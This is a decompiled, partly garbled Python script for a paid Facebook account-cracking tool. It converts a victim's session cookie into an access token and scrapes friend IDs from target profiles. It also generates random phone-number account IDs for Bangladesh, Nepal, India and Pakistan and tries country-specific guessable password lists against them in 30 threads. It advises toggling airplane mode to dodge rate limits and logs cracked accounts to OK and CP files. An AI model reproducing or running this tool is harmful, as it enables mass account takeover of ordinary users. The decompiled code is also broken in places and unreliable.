        h = '\x1b[1;92m'
        hh = '\x1b[32m'
        u = '\x1b[95m'
        kk = '\x1b[33m'
        b = '\x1b[1;96m'
        p = '\x1b[0;34m'
        asu = random.choice([
            m,
            k,
            h,
            u,
            b])
        A = '\x1b[1;97m'
        R = '\x1b[38;5;196m'
        Y = '\x1b[1;33m'
        G = '\x1b[38;5;48m'
        B = '\x1b[38;5;8m'
        G1 = '\x1b[38;5;46m'
        G2 = '\x1b[38;5;47m'
        G3 = '\x1b[38;5;48m'
        G4 = '\x1b[38;5;49m'
        G5 = '\x1b[38;5;50m'
        X = '\x1b[1;34m'
        X1 = '\x1b[38;5;14m'
        X2 = '\x1b[38;5;123m'
        X3 = '\x1b[38;5;122m'
        X4 = '\x1b[38;5;86m'
        X5 = '\x1b[38;5;121m'
        S = '\x1b[1;96m'
        M = '\x1b[38;5;205m'
        P = '\x1b[1;36m'
        O = '\x1b[1;35m'
        dic = {
            '1': 'JANUARY',
            '2': 'FEBRUARY',
            '3': 'MARCH',
            '4': 'APRIL',
            '5': 'MAY',
            '6': 'JUNE',
            '7': 'JULY',
            '8': 'AUGUST',
            '9': 'SEPTEMBER',
            '10': 'OCTOBER',
            '11': 'NOVEMBER',
            '12': 'DECEMBER' }
        dic2 = {
            '01': 'JANUARY',
            '02': 'FEBRUARY',
            '03': 'MARCH',
            '04': 'APRIL',
            '05': 'MAY',
            '06': 'JUNE',
            '07': 'JULY',
            '08': 'AUGUST',
            '09': 'SEPTEMBER',
            '10': 'OCTOBER',
            '11': 'NOVEMBER',
            '12': 'DECEMBER' }
        tgl = datetime.datetime.now().day
        bln = dic[str(datetime.datetime.now().month)]
        thn = datetime.datetime.now().year
        okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
        cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
        date = str(tgl) + '/' + str(bln) + '/' + str(thn)
        ltx = int(lt()[3])
        if ltx > 12:
            a = ltx - 12
            tag = 'Belka'
a = ltx
tag = 'Bihana'

def restart():
    os.system(f'''python {__file__}''')
    os.system('exit')


def animation(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        return None


def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)
        return None


def clear():
    os.system('clear')


def back():
    login()


def contact():
    os.system('xdg-open https://www.facebook.com/harryexeee')
    back()


def linex():
    print('\x1b[37m----------------------------------------------')


def cls():
    os.system('clear')
    banner()
    info()

response = requests.get('https://api.ipify.org?format=json')
ipadd = response.json()['ip']
logo = "\n\n\n\x1b[38;5;46m .----------------.  .----------------.  .----------------. \n| .--------------. || .--------------. || .--------------. |\n| |  _______     | || |  ____  ____  | || |  ____  ____  | |\n\x1b[38;5;121m| | |_   __ \\    | || | |_  _||_  _| | || | |_   ||   _| | |\n| |   | |__) |   | || |   \\ \\  / /   | || |   | |__| |   | |\n| |   |  __ /    | || |    > `' <    | || |   |  __  |   | |\n| |  _| |  \\ \\_  | || |  _/ /'`\\ \\_  | || |  _| |  | |_  | |\n| | |____| |___| | || | |____||____| | || | |____||____| | |\n\x1b[1;96m| |              | || |              | || |              | |\n| '--------------' || '--------------' || '--------------' |\n '----------------'  '----------------'  '----------------' \n"

def info():
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;47m]\x1b[1;97m Author   : RUSTAPxHAKKU\n\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;47m]\x1b[1;97m Tools    : PAID\n\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;47m]\x1b[1;97m PARTNER? : HAKKU, UNIKER\n\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;47m]\x1b[1;97m UPDATE?  : \x1b[38;5;196m 1.5.1 \x1b[1;97m\n\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def banner():
    print(logo)

response = requests.get('https://api.ipify.org?format=json')
ipadd = response.json()['ip']

def tahun(fx):
    if len(fx) == 15:
        if fx[:10] in ('1000000000',):
            tahunz = '2009'
        if fx[:9] in ('100000000',):
            tahunz = '2009'
        if fx[:8] in ('10000000',):
            tahunz = '2009'
        if fx[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
            tahunz = '2009'
        if fx[:7] in ('1000006', '1000007', '1000008', '1000009'):
            tahunz = '2010'
        if fx[:6] in ('100001',):
            tahunz = '2010'
        if fx[:6] in ('100002', '100003'):
            tahunz = '2011'
        if fx[:6] in ('100004',):
            tahunz = '2012'
        if fx[:6] in ('100005', '100006'):
            tahunz = '2013'
        if fx[:6] in ('100007', '100008'):
            tahunz = '2014'
        if fx[:6] in ('100009',):
            tahunz = '2015'
        if fx[:5] in ('10001',):
            tahunz = '2016'
        if fx[:5] in ('10002',):
            tahunz = '2017'
        if fx[:5] in ('10003',):
            tahunz = '2018'
        if fx[:5] in ('10004',):
            tahunz = '2019'
        if fx[:5] in ('10005',):
            tahunz = '2020'
        if fx[:5] in ('10006',):
            tahunz = '2021'
        if fx[:5] in ('10009',):
            tahunz = '2023'
        if fx[:4] in ('6155',):
            tahunz = '2024'
        if fx[:5] in ('10007', '10008'):
            tahunz = '2022'
        tahunz = ''
    if len(fx) in (9, 10):
        tahunz = '2008'
    if len(fx) == 8:
        tahunz = '2007'
    if len(fx) == 7:
        tahunz = '2006'
    tahunz = ''
    return tahunz

if not os.path.exists('data'):
    os.mkdir('data')
open('data/name.xml', 'r')
if FileNotFoundError:
    open('data/name.xml', 'w')
open('data/password.xml', 'r')
if FileNotFoundError:
    open('data/password.xml', 'w')

def namepsw():
    os.system('clear')
    banner()
    if os.path.exists('data/name.xml') and os.path.getsize('data/name.xml') > 0:
        name_file_obj = open('data/name.xml', 'r')
        uname = name_file_obj.readline().strip()
        None(None, None)
        if not None:
            pass
    print(' [\x1b[36m•\x1b[1;37m] ENTER YOUR REAL NAME')
    linex()
    uname = input(' [\x1b[36m•\x1b[1;37m] ENTER YOUR NAME : ')
    linex()
    name_file_obj = open('data/name.xml', 'w')
    name_file_obj.write(uname)
    None(None, None)
    if not None:
        pass
    if os.path.exists('data/password.xml') and os.path.getsize('data/password.xml') > 0:
        password_file_obj = open('data/password.xml', 'r')
        upass = password_file_obj.readline().strip()
        None(None, None)
        if not None:
            pass
    print(' [\x1b[36m•\x1b[1;37m] ADD A PSW TO YOUT ACCOUNT')
    linex()
    upass = input(' [\x1b[36m•\x1b[1;37m] ENTER YOUR PASSWORD : ')
    linex()
    password_file_obj = open('data/password.xml', 'w')
    password_file_obj.write(upass)
    None(None, None)
    if not None:
        pass
    animation(' [\x1b[36m>\x1b[1;37m] YOUR DETAILS HAS BEEN CHANGED ')
    exit()

name_file = open('data/name.xml', 'r')
uname = name_file.readline().strip()
None(None, None)
if not None:
    pass
password_file = open('data/password.xml', 'r')
upass = password_file.readline().strip()
None(None, None)
if not None:
    pass
if len(uname) > 1 and len(upass) > 1:
    pass
namepsw()
if FileNotFoundError:
    namepsw()
if IOError:
    namepsw()

def login123():
    os.system('clear')
    banner()
    info()
    print(' \x1b[38;5;196m>>\x1b[37m USE SB COOKIE ')
    linex()
    print(' \x1b[38;5;46m[\x1b[1;97m1\x1b[38;5;46m]\x1b[1;97m LOGIN USING COOKIE ')
    print(' \x1b[38;5;46m[\x1b[1;97m2\x1b[38;5;46m]\x1b[1;97m FILE CLONE')
    print(' \x1b[38;5;46m[\x1b[1;97m3\x1b[38;5;46m]\x1b[1;97m RANDOM CLONE')
    print(' \x1b[38;5;46m[\x1b[1;97m0\x1b[38;5;46m]\x1b[1;97m JOIN GROUPS  ')
    linex()
    lgmt = input(' CHOOSE : ')
    if lgmt == '1':
        login_lagi334()
        return None
    if None == '2':
        crack_file()
        return None
    if None == '3':
        _randm_()
        return None
    if None == '0':
        groups()
        return None
    None()
    animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
    restart()


def login():
    token = open('data/.token.txt', 'r').read()
    cok = open('data/.cok.txt', 'r').read()
    tokenku.append(token)
    sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies = {
        'cookie': cok })
    sy2 = json.loads(sy.text)['name']
    sy3 = json.loads(sy.text)['id']
    menu(sy2, sy3)
    return None
    if KeyError:
        login123()
        return None
    if None.exceptions.ConnectionError:
        animation(' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
        exit()
        return None
    if IOError:
        login123()
        return None


def login_lagi334():
    asu = random.choice([
        m,
        k,
        h,
        b,
        u])
    os.system('clear')
    print(logo)
    cookie = input(f'''\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;33mCOOKIE :{asu} ''')
    open('data/.cok.txt', 'w').write(cookie)
    rsn = requests.Session()
    rsn.headers.update({
        'Accept-Language': 'id,en;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Referer': 'https://www.instagram.com/',
        'Host': 'www.facebook.com',
        'Sec-Fetch-Mode': 'cors',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Dest': 'empty',
        'Origin': 'https://www.instagram.com',
        'Accept-Encoding': 'gzip, deflate' })
    response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies = {
        'cookie': cookie })
    if '"access_token":' in str(response.headers):
        token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
        open('data/.token.txt', 'w').write(token)
        print(f'''{h!s}Login Succes{p!s}''')
    print(f'''{m!s}Failled Get Token{p!s}''')
    print('Failled Get Token')
    None(None, None)
    if not None:
        pass
    print('\x1b[1;31m[\x1b[1;96m•\x1b[1;31m] \x1b[1;33mRUN AGAIN ')
    time.sleep(1)
    exit()
    return None
    if Exception:
        e = None
        os.system('rm -f data/.token.txt')
        os.system('rm -f data/.cok.txt')
        print('  %s[%sx%s]%s LOGIN AGAIN !!%s' % (x, k, x, m, x))
        print(e)
        exit()
        e = None
        del e
        return None
    e = None
    del e


def bot():
    requests.post('https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s' % tokenku)
    return None


def menu(my_name, my_id):
    token = open('data/.token.txt', 'r').read()
    cok = open('data/.cok.txt', 'r').read()
    if IOError:
        print('[×] INVIALD COOKIE ')
        time.sleep(5)
        login()
    os.system('clear')
    banner()
    info()
    print(' [\x1b[36m•\x1b[1;37m] WELCOME     : ' + uname)
    print(' [\x1b[36m•\x1b[1;37m] IP ADDRESS    : ' + ipadd)
    print(' [\x1b[36m•\x1b[1;37m] TODAYS DATE : ' + date)
    linex()
    print(' [\x1b[36m1\x1b[1;37m] CRACK PUBLIC       [\x1b[36m5\x1b[1;37m] CRACK RANDOM')
    print(' [\x1b[36m2\x1b[1;37m] CRACK FILE         [\x1b[36m6\x1b[1;37m] CONTACT ADMIN')
    print(' [\x1b[36m3\x1b[1;37m] CHECK RESULTS      [\x1b[36m0\x1b[1;37m] LOGOUT MENU')
    print(' [\x1b[36m4\x1b[1;37m] RESET PASSWORD')
    linex()
    _____cowok__pink_____ = input(' CHOOSE : ')
    if _____cowok__pink_____ in ('1',):
        dump_massal()
        return None
    if None in ('2',):
        crack_file()
        return None
    if None in ('3', '03'):
        result()
        return None
    if None in ('4', '04'):
        input
        os.system('rm -rf data/password.xml')
        linex()
        animation(' [✓] PASSWORD RESET ')
        exit()
        return None
    if None in ('5', '05'):
        _randm_()
        return None
    if None in ('6', '06'):
        contact()
        return None
    if None in ('0',):
        os.system('rm -rf data/.token.txt')
        os.system('rm -rf .cookie.txt')
        linex()
        animation(' [✓] DONE LOGOUT ')
        exit()
        return None
    None()
    animation(' [×] SELECT CORRECTLY ')
    back()


def result():
    linex()
    os.system('clear')
    banner()
    print(' [\x1b[36m1\x1b[1;37m] CHECK CP IDZ ')
    print(' [\x1b[36m2\x1b[1;37m] CHECK OK IDZ ')
    print(' [\x1b[36m0\x1b[1;37m] EXIT ')
    linex()
    kz = input(' [\x1b[36m•\x1b[1;37m] CHOOSE : ')
    if kz in ('1', '01'):
        vin = os.listdir('CP')
        if FileNotFoundError:
            linex()
            animation(' [\x1b[36m×\x1b[1;37m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin) == 0:
            linex()
            animation(' [\x1b[36m•\x1b[1;37m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
            return None
        cih = None
        lol = { }
        for isi in vin:
            hem = open('CP/' + isi, 'r').readlines()
            cih += 1
            if cih < 10:
                nom = '' + str(cih)
                lol.update({
                    str(cih): str(isi) })
                lol.update({
                    nom: str(isi) })
                linex()
                print(' ' + nom + '. ' + isi + '\x1b[31m ' + str(len(hem)) + ' \x1b[0m CP ' + x)
            lol.update({
                str(cih): str(isi) })
            print(' ' + str(cih) + '. ' + isi + '\x1b[31m ' + str(len(hem)) + ' \x1b[0m CP ' + x)
            linex()
            geeh = input(' [\x1b[36m•\x1b[1;37m] CHOOSE : ')
            linex()
            geh = lol[geeh]
            if KeyError:
                linex()
                animation(' [\x1b[36m×\x1b[1;37m] NO OPTION FOUND ')
                exit()
        lin = open('CP/' + geh, 'r').read().splitlines()
        linex()
        animation(' [\x1b[36m×\x1b[1;37m] FILE NOT FOUND ')
        time.sleep(2)
        back()
        nocp = 0
        for cpku in range(len(lin)):
            cpkuni = lin[nocp].split('|')
            print(f''' [\x1b[36m•\x1b[1;37m] CP : \x1b[33m {cpkuni[0]}|{cpkuni[1]}\x1b[0m''')
            nocp += 1
            linex()
            input(' >> PRESS ENTER TO BACK ')
            back()
            return None
            if kz in ('2', '02'):
                vin = os.listdir('OK')
                if FileNotFoundError:
                    linex()
                    animation(' [\x1b[36m×\x1b[1;37m] FILE NOT FOUND ')
                    time.sleep(2)
                    back()
                if len(vin) == 0:
                    linex()
                    animation(' [\x1b[36m•\x1b[1;37m] NO OK RESULTS FOUND ')
                    time.sleep(2)
                    back()
                    return None
                cih = None
                lol = { }
                for isi in vin:
                    hem = open('OK/' + isi, 'r').readlines()
                    cih += 1
                    if cih < 100:
                        linex()
                        nom = '' + str(cih)
                        lol.update({
                            str(cih): str(isi) })
                        lol.update({
                            nom: str(isi) })
                        print(' ' + nom + '. ' + isi + '\x1b[32m ' + str(len(hem)) + ' \x1b[0m OK ' + x)
                    lol.update({
                        str(cih): str(isi) })
                    print(' ' + str(cih) + '. ' + isi + '\x1b[32m ' + str(len(hem)) + ' \x1b[0m OK ' + x)
                    linex()
                    geeh = input(' [\x1b[36m•\x1b[1;37m] CHOOSE : ')
                    linex()
                    geh = lol[geeh]
                    if KeyError:
                        linex()
                        animation(' [\x1b[36m×\x1b[1;37m] NO OPTION FOUND ')
                        exit()
                lin = open('OK/' + geh, 'r').read().splitlines()
                linex()
                animation(' [\x1b[36m×\x1b[1;37m] FILE NOT FOUND ')
                time.sleep(2)
                back()
                nocp = 0
                for cpku in range(len(lin)):
                    cpkuni = lin[nocp].split('|')
                    print(f''' [\x1b[36m•\x1b[1;37m] OK : \x1b[32m {cpkuni[0]}|{cpkuni[1]}\x1b[0m''')
                    nocp += 1
                    linex()
                    input(' >> PRESS ENTER TO BACK ')
                    back()
                    return None
                    if kz in ('0', '00'):
                        back()
                        return None
                    None()
                    animation(' [\x1b[36m×\x1b[1;37m] NO OPTION FOUND IN MENU')
                    exit()
                    return None


def dump_massal():
    token = open('data/.token.txt', 'r').read()
    cok = open('data/.cok.txt', 'r').read()
    if IOError:
        print(f'''{m}cookie khaidiyo arule😭''')
        exit()
    print('')
    dwi = int(input('[\x1b[36m•\x1b[1;37m] ENTER TARGET AMOUNT  : '))
    if ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input('[\x1b[36m•\x1b[1;37m] INPUT UID ' + str(_dwi_) + ' : ')
        uid.append(Masukan)
        for user in uid:
            head = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' }
            if len(id) == 0:
                params = {
                    'access_token': token,
                    'fields': 'friends' }
            params = {
                'access_token': token,
                'fields': 'friends' }
            url = requests.get('https://graph.facebook.com/{}'.format(user), params = params, headers = head, cookies = {
                'cookies': cok }).json()
            for proses in url['friends']['data']:
                woy = proses['id'] + '|' + proses['name']
                if woy in id:
                    pass
                id.append(woy)
                if (KeyError, IOError):
                    pass
            if requests.exceptions.ConnectionError:
                linex()
            animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
            os.system('clear')
            linex()
            banner()
            info()
            print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL ID : \x1b[38;5;196m' + str(len(id)) + '\x1b[37m')
            setting()
            return None
            if requests.exceptions.ConnectionError:
                print(f'''{u}''')
                back()
                return None
            if (None, IOError):
                linex()
                animation(' [×] DUMP ID FAILED ')
                time.sleep(3)
                back()
                return None


def crack_file():
    linex()
    o = input(' [\x1b[36m•\x1b[1;37m] FILE NAME : ')
    lin = open(o).read().splitlines()
    linex()
    animation(' [×] FILE NOT FOUND')
    time.sleep(2)
    back()
    for xid in lin:
        id.append(xid)
        setting()
        return None


def _randm_():
    clear()
    banner()
    info()
    print('\x1b[1;31m[\x1b[1;32m1\x1b[1;31m]\x1b[1;37m BANGLADESH CLONING')
    print('\x1b[1;31m[\x1b[1;32m2\x1b[1;31m]\x1b[1;37m NEPAL CLONING')
    print('\x1b[1;31m[\x1b[1;32m3\x1b[1;31m]\x1b[1;37m INDIAN CLONING')
    print('\x1b[1;31m[\x1b[1;32m0\x1b[1;31m]\x1b[1;37m BACK TO MAIN MENU')
    linex()
    select = input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE :{G5} ''')
    if select == '1':
        _bd_()
        return None
    if None == '2':
        _Nepal_()
        return None
    if None == '3':
        _India_()
        return None
    if None == '4':
        _Pk_()
        return None
    if None == '5':
        _Malaysia_()
        return None
    if None == '6':
        _Afg_()
        return None
    if None == '0':
        menu()
        return None
    None('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m] VALID OPTION')
    time.sleep(2)
    _randm_()


def _bd_():
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G1} 017{G}/{G1}019{G}/{G1}018{G}/{G1}016''')
    linex()
    code = input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G2} ''')
    name = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
    cod = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999''')
    linex()
    limit = int(input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G4} '''))
    for x in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(4)())
        user.append(nmp)
        clear()
        sexy = tred(max_workers = 30)
        clear()
        banner()
        info()
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m SIM CODE  {G}:{G1} {code}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL UID {G}:{G2} {str(len(user))}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TODAY DATE {G}:{G2} {date}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN''')
        print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m BANGLADESH RANDOM CLONING PROCESSING ')
        linex()
        for love in user:
            ids = code + name + cod + love
            psd = [
                code + name + cod + love,
                cod + love,
                name + love,
                code + name + cod,
                'bangladesh',
                'Bangladesh']
            sexy.submit(randm, ids, psd)
            None(None, None)
            if not ''.join:
                pass
    ''.join
    ''.join
    print('')
    print(f'''\r{A}──────────────────────────────────────────────────''')
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m THE PROCESS HAS BEEN COMPLETED')
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL OK ID {G}:{G2} %s ''' % ok)
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL CP ID {G}:{G3} %s ''' % cp)
    print(f'''\r{A}──────────────────────────────────────────────────''')
    input('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m PRESS ENTER TO BACK ')
    menu()


def _Nepal_():
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G1} 9823{G}/{G1}9818{G}/{G1}9810{G}/{G1}9742 ''')
    linex()
    code = input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G2} ''')
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999''')
    linex()
    limit = int(input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G4} '''))
    for x in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(6)())
        user.append(nmp)
        clear()
        sexy = tred(max_workers = 30)
        clear()
        banner()
        info()
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m SIM CODE  :{G1} {code}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL UID :{G2} {str(len(user))}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TODAY DATE :{G2} {date}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TURN {A}[{R}ON{G}/{R}OFF{G3}]{A} AIRPLANE MODE EVERY 5 MIN''')
        print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m NEPAL RANDOM CLONING PROCESSING ')
        linex()
        for love in user:
            ids = code + love
            psd = [
                ids,
                love,
                ids[:8],
                ids[7],
                ids[6],
                'kathmandu',
                'nepal123',
                'magar',
                'magar123',
                'tamang',
                'tamang123',
                'pokhara',
                'maya',
                'maya123',
                'pokhara12',
                'gurung',
                'kumari',
                'kathmandu12']
            sexy.submit(randm, ids, psd)
            None(None, None)
            if not ''.join:
                pass
    print('')
    print(f'''\r{A}──────────────────────────────────────────────────''')
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m THE PROCESS HAS BEEN COMPLETED')
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL OK ID {G}:{G2} %s ''' % ok)
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL CP ID {G}:{G3} %s ''' % cp)
    print(f'''\r{A}──────────────────────────────────────────────────''')
    input('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m PRESS ENTER TO BACK ')
    menu()


def _India_():
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G1} +91639{G}/{G1}+91934{G}/{G1}+91901{G}/{G1}+91914 ''')
    linex()
    code = input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G2} ''')
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999''')
    linex()
    limit = int(input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G4} '''))
    for x in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        clear()
        sexy = tred(max_workers = 30)
        clear()
        banner()
        info()
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m SIM CODE  {G}:{G1} {code}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL UID {G}:{G2} {str(len(user))}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TODAY DATE {G}:{G2} {date}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN''')
        print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m INDIA RANDOM CLONING PROCESSING ')
        linex()
        for love in user:
            ids = code + love
            psd = [
                love,
                ids[:8],
                '57273200',
                '59039200',
                '57575751']
            sexy.submit(randm, ids, psd)
            None(None, None)
            if not ''.join:
                pass
    print('')
    print(f'''\r{A}──────────────────────────────────────────────────''')
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m THE PROCESS HAS BEEN COMPLETED')
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL OK ID {G}:{G2} %s ''' % ok)
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL CP ID {G}:{G3} %s ''' % cp)
    print(f'''\r{A}──────────────────────────────────────────────────''')
    input('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m PRESS ENTER TO BACK ')
    menu()


def _Pk_():
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G1} 0300{G}/{G1}0303{G}/{G1}0302{G}/{G1}0306 ''')
    linex()
    code = input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G2} ''')
    clear()
    banner()
    info()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999''')
    linex()
    limit = int(input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G4} '''))
    for x in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        clear()
        sexy = tred(max_workers = 30)
        clear()
        banner()
        info()
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m SIM CODE  {G}:{G1} {code}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL UID {G}:{G2} {str(len(user))}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TODAY DATE {G}:{G2} {date}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN''')
        print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m PAKISTAN RANDOM CLONING PROCESSING ')
        linex()
        for love in user:
            ids = code + love
            psd = [
                love,
                ids,
                'khankhan',
                'khan1122',
                'ali12345',
                'khanbaba',
                'pakistan',
                'khan12345',
                'ali1122',
                'khankhan12345',
                'khan',
                'baloch',
                'pubg',
                'pubg1122']
            sexy.submit(randm, ids, psd)
            None(None, None)
            if not ''.join:
                pass
    print('')
    print(f'''\r{A}──────────────────────────────────────────────────''')
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m THE PROCESS HAS BEEN COMPLETED')
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL OK ID {G}:{G2} %s ''' % ok)
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL CP ID {G}:{G3} %s ''' % cp)
    print(f'''\r{A}──────────────────────────────────────────────────''')
    input('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m PRESS ENTER TO BACK ')
    menu()


def _Malaysia_():
    clear()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G1} 011{G}/{G1}012{G}/{G1}013{G}/{G1}010 ''')
    linex()
